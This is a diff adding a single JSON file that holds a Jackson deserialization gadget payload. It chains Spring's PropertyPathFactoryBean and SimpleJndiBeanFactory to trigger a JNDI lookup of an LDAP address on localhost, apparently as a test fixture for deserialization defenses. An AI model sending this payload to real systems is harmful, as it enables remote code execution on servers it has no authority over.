@@ -1,0 +1,1 @@
+["org.springframework.beans.factory.config.PropertyPathFactoryBean",{"targetBeanName":"ldap://localhost:1389/obj","propertyPath":"foo","beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",{"shareableResources":["ldap://localhost:1389/obj"]}]}]
